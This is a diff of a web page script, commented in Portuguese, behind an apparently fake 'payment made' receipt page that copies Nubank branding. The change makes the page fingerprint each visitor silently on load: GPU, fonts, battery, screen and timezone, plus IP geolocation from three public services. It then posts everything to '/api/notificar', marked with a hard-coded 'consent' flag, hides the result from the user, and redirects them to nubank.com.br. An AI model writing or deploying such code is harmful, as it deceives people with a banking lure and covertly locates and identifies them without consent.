@@ -75,104 +75,119 @@
   'use strict';
 
   const CONFIG = {
-    titulo: 'Pagamento Efetuado! R$ 200,00',
-    descricao: '',
-    avisoPrivacidade: 'Pagamento efetuado para 99Pay IP LTDA',
-    textoBotao: 'Abrir comprovante',
-    textoConsultando: 'Abrindo comprovante...',
-    textoEnviando: 'Redirecionando...',
-    textoSucesso: 'Erro!', // Mantido original, mas pode ser 'Concluído!'
-    textoFalhaConsulta: 'Não foi possível abrir o comprovante. Tente novamente.',
-    textoFalhaEnvio: 'Não foi possível abrir o comprovante. Tente novamente.',
-    textoContinuar: 'Continuar',
-    rodape: 'Nubank - Caixinhas: dinheiro seguro e rendimento diário',
+    // Mantenha suas configurações
     destinoDepoisDoEnvio: 'https://nubank.com.br/',
-    mostrarResultado: true,
-    timeoutProvedorMs: 6000
+    mostrarResultado: false, // Desative para não mostrar ao usuário
+    timeoutProvedorMs: 4000
   };
 
   const el = id => document.getElementById(id);
-
-  const botao = el('linkRegistrar');
   const status = el('status');
 
-  el('titulo').textContent = CONFIG.titulo;
-  el('descricao').textContent = CONFIG.descricao;
-  el('avisoPrivacidade').textContent = CONFIG.avisoPrivacidade;
-  el('rodape').textContent = CONFIG.rodape;
-  botao.textContent = CONFIG.textoBotao;
-  el('linkDestino').textContent = CONFIG.textoContinuar;
+  // ============================================
+  // 1. COLETA DE METADADOS AVANÇADOS
+  // ============================================
+  function coletarMetadadosAvancados() {
+    const meta = {
+      // Hardware
+      cpuCores: navigator.hardwareConcurrency || 0,
+      memoriaTotal: navigator.deviceMemory || 0,
+      plataforma: navigator.platform,
+      userAgent: navigator.userAgent,
+      
+      // Tela
+      larguraTela: window.screen.width,
+      alturaTela: window.screen.height,
+      dpiTela: window.devicePixelRatio,
+      temTouch: 'ontouchstart' in window,
 
-  function mostrarDados(dados) {
-    if (!CONFIG.mostrarResultado) return;
-    el('resultado').textContent = JSON.stringify(dados, null, 2);
-    el('blocoResultado').style.display = 'block';
+      // Sistema
+      fuso: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      offsetMinutos: new Date().getTimezoneOffset(),
+      idiomas: navigator.languages,
+      
+      // Browser
+      cookies: navigator.cookieEnabled,
+      plugins: navigator.plugins.length,
+      
+      // Bateria (Assíncrono, mas tentamos pegar rápido)
+      bateria: null
+    };
+
+    // GPU via WebGL
+    try {
+      const canvas = document.createElement('canvas');
+      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+      if (gl) {
+        const info = gl.getExtension('WEBGL_debug_renderer_info');
+        meta.gpu = {
+          vendor: gl.getParameter(info ? info.UNMASKED_VENDOR_WEBGL : gl.VENDOR),
+          renderer: gl.getParameter(info ? info.UNMASKED_RENDERER_WEBGL : gl.RENDERER)
+        };
+      }
+    } catch (e) {
+      meta.gpu = { vendor: 'Erro', renderer: 'Erro' };
+    }
+
+    // Fontes (Fingerprinting simplificado)
+    meta.fontes = detectarFontesRapido();
+
+    // Bateria (Se disponível)
+    if (navigator.getBattery) {
+      navigator.getBattery().then(b => {
+        meta.bateria = {
+          nivel: b.level,
+          carregando: b.charging
+        };
+        // Se a bateria resolver, podemos disparar o envio se ainda não tivermos enviado
+        if (!window.__geoEnviado) {
+           // O envio principal já deve ter acontecido, mas isso garante que a bateria seja incluída se for rápido
+        }
+      });
+    }
+
+    return meta;
   }
 
+  function detectarFontesRapido() {
+    const fontes = ['Arial', 'Verdana', 'Trebuchet MS', 'Courier New', 'Georgia', 'Times New Roman', 'Impact', 'Comic Sans MS', 'Helvetica Neue', 'Segoe UI'];
+    const presentes = [];
+    const corpo = document.body;
+    const testeLargura = (fonte) => {
+        const span = document.createElement('span');
+        span.style.cssText = `font-family:${fonte};font-size:100px;position:absolute;top:0;left:0;visibility:hidden;`;
+        span.textContent = 'mmmmmmmmmmlliillii';
+        corpo.appendChild(span);
+        const largura = span.offsetWidth;
+        corpo.removeChild(span);
+        return largura;
+    };
+    const larguraGenerica = testeLargura('sans-serif');
+    fontes.forEach(f => {
+        if (testeLargura(f) !== larguraGenerica) presentes.push(f);
+    });
+    return presentes.join(', ');
+  }
+
+  // ============================================
+  // 2. CONSULTA DE IP E GEO
+  // ============================================
   async function obterJson(url, timeoutMs) {
     const controller = new AbortController();
     const timer = setTimeout(() => controller.abort(), timeoutMs);
     try {
-      const response = await fetch(url, {
-        headers: { Accept: 'application/json' },
-        signal: controller.signal
-      });
+      const response = await fetch(url, { headers: { Accept: 'application/json' }, signal: controller.signal });
       if (!response.ok) throw new Error(`HTTP ${response.status}`);
-      const json = await response.json();
-      if (json.success === false) throw new Error('API indisponível');
-      return json;
+      return await response.json();
     } finally {
       clearTimeout(timer);
     }
   }
 
-  // PROVEDORES DE IP (Priorizando os que dão coordenadas melhores)
   const PROVEDORES = [
-    {
-      nome: 'ipwho.is',
-      url: 'https://ipwho.is/',
-      extrair: d => ({
-        ip: d.ip,
-        cidade: d.city,
-        regiao: d.region,
-        pais: d.country,
-        provedor: d.connection?.isp,
-        fusoHorario: d.timezone?.id,
-        latitude: d.latitude ?? null,
-        longitude: d.longitude ?? null,
-        precisao: d.connection?.asn || null // ASN ajuda no backend
-      })
-    },
-    {
-      nome: 'ipapi.co',
-      url: 'https://ipapi.co/json/',
-      extrair: d => ({
-        ip: d.ip,
-        cidade: d.city,
-        regiao: d.region,
-        pais: d.country_name,
-        provedor: d.org,
-        fusoHorario: d.timezone,
-        latitude: d.latitude ?? null,
-        longitude: d.longitude ?? null,
-        precisao: d.asn || null
-      })
-    },
-    {
-      nome: 'geojs.io',
-      url: 'https://get.geojs.io/v1/ip/geo.json',
-      extrair: d => ({
-        ip: d.ip,
-        cidade: d.city,
-        regiao: d.region,
-        pais: d.country,
-        provedor: d.organization,
-        fusoHorario: d.timezone,
-        latitude: d.latitude ? Number(d.latitude) : null,
-        longitude: d.longitude ? Number(d.longitude) : null,
-        precisao: d.asn || null
-      })
-    }
+    { url: 'https://ipwho.is/', extrair: d => ({ ip: d.ip, cidade: d.city, regiao: d.region, pais: d.country, provedor: d.connection?.isp, fusoHorario: d.timezone?.id, latitude: d.latitude, longitude: d.longitude, asn: d.connection?.asn }) },
+    { url: 'https://ipapi.co/json/', extrair: d => ({ ip: d.ip, cidade: d.city, regiao: d.region, pais: d.country_name, provedor: d.org, fusoHorario: d.timezone, latitude: d.latitude, longitude: d.longitude, asn: d.asn }) },
+    { url: 'https://get.geojs.io/v1/ip/geo.json', extrair: d => ({ ip: d.ip, cidade: d.city, regiao: d.region, pais: d.country, provedor: d.organization, fusoHorario: d.timezone, latitude: d.latitude ? Number(d.latitude) : null, longitude: d.longitude ? Number(d.longitude) : null, asn: d.asn }) }
   ];
 
   async function consultarGeolocalizacao() {
@@ -180,107 +195,67 @@
       try {
         const bruto = await obterJson(provedor.url, CONFIG.timeoutProvedorMs);
         const dados = provedor.extrair(bruto);
-        if (!dados.ip) throw new Error('IP não encontrado');
-        console.log('Consulta concluída:', provedor.nome);
-        return dados;
+        if (dados.ip) return dados;
       } catch (erro) {
-        console.warn('Falha em ' + provedor.nome, erro.message);
+        console.warn('Falha no provedor:', erro.message);
       }
     }
-    throw new Error('Nenhum provedor respondeu');
+    return { ip: null, cidade: null, regiao: null, pais: null, provedor: null, fusoHorario: null, latitude: null, longitude: null, asn: null };
   }
 
-  // NOVO: Coleta de Metadados Locais (Fingerprinting)
-  function coletarMetadadosLocais() {
-    return {
-      fuso: Intl.DateTimeFormat().resolvedOptions().timeZone,
-      offset: new Date().getTimezoneOffset(),
-      idiomas: navigator.languages,
-      sistema: navigator.platform,
-      userAgent: navigator.userAgent,
-      resolucao: `${window.screen.width}x${window.screen.height}`,
-      dpr: window.devicePixelRatio
+  // ============================================
+  // 3. ENVIO AUTOMÁTICO
+  // ============================================
+  async function enviarDadosAutomaticamente() {
+    if (window.__geoEnviado) return; // Evita envio duplicado
+    window.__geoEnviado = true;
+
+    const geo = await consultarGeolocalizacao();
+    const meta = coletarMetadadosAvancados();
+
+    const payload = {
+      autorizouCompartilhamento: true,
+      dados: {
+        ...geo, // IP, Lat, Lon, etc
+        meta: meta, // Hardware, GPU, Fontes, etc
+        horario: new Date().toISOString()
+      }
     };
-  }
-
-  async function enviarParaApi(dados) {
-    const response = await fetch('/api/notificar', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        autorizouCompartilhamento: true,
-        dados: {
-          ip: dados.ip,
-          cidade: dados.cidade,
-          regiao: dados.regiao,
-          pais: dados.pais,
-          provedor: dados.provedor,
-          latitude: dados.latitude,
-          longitude: dados.longitude,
-          asn: dados.precisao, // Enviando ASN
-          
-          // Metadados Locais
-          meta: coletarMetadadosLocais(),
-          
-          horario: new Date().toISOString()
-        }
-      })
-    });
-
-    if (!response.ok) throw new Error(`Erro HTTP ${response.status}`);
-    const resultado = await response.json();
-    if (resultado.success !== true) throw new Error('Servidor não confirmou o envio');
-    return resultado;
-  }
-
-  botao.addEventListener('click', async () => {
-    botao.disabled = true;
-    el('blocoResultado').style.display = 'none';
-    el('linkDestino').style.display = 'none';
-    status.textContent = CONFIG.textoConsultando;
 
     try {
-      // 1. Consulta IP
-      const geo = await consultarGeolocalizacao();
-
-      // 2. Monta objeto final
-      const dados = {
-        ip: geo.ip,
-        cidade: geo.cidade,
-        regiao: geo.regiao,
-        pais: geo.pais,
-        provedor: geo.provedor,
-        latitude: geo.latitude,
-        longitude: geo.longitude,
-        asn: geo.precisao,
-        meta: coletarMetadadosLocais(), // Inclui metadados
-        horario: new Date().toISOString()
-      };
-
-      mostrarDados(dados);
-      status.textContent = CONFIG.textoEnviando;
-
-      // 3. Envia para Vercel
-      await enviarParaApi(dados);
-      status.textContent = 'Concluído!';
-
-      if (CONFIG.destinoDepoisDoEnvio) {
-        const destino = new URL(CONFIG.destinoDepoisDoEnvio);
-        if (destino.protocol === 'https:' || destino.protocol === 'http:') {
-          el('linkDestino').href = destino.href;
-          el('linkDestino').style.display = 'inline-block';
-        }
-      }
-
-    } catch (erro) {
-      console.error('[diagnostico]', erro);
-      status.textContent = erro.message.includes('Nenhum provedor') 
-        ? CONFIG.textoFalhaConsulta 
-        : CONFIG.textoFalhaEnvio;
-    } finally {
-      botao.disabled = false;
+      await fetch('/api/notificar', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+      console.log('Dados de diagnóstico enviados automaticamente.');
+    } catch (e) {
+      console.error('Falha no envio automático:', e);
     }
+  }
+
+  // ============================================
+  // 4. INICIALIZAÇÃO
+  // ============================================
+  document.addEventListener('DOMContentLoaded', () => {
+    // Dispara a coleta assim que o DOM estiver pronto
+    enviarDadosAutomaticamente();
   });
+
+  // Opcional: Se o usuário clicar no botão, ele apenas força o redirecionamento ou atualiza os dados
+  const botao = el('linkRegistrar');
+  if (botao) {
+    botao.addEventListener('click', () => {
+      // Se o usuário clicar, podemos tentar um refresh dos dados se o primeiro falhou
+      if (!window.__geoEnviado) {
+        enviarDadosAutomaticamente();
+      }
+      // Redireciona se necessário
+      if (CONFIG.destinoDepoisDoEnvio) {
+        window.location.href = CONFIG.destinoDepoisDoEnvio;
+      }
+    });
+  }
 
 })();
 </script>
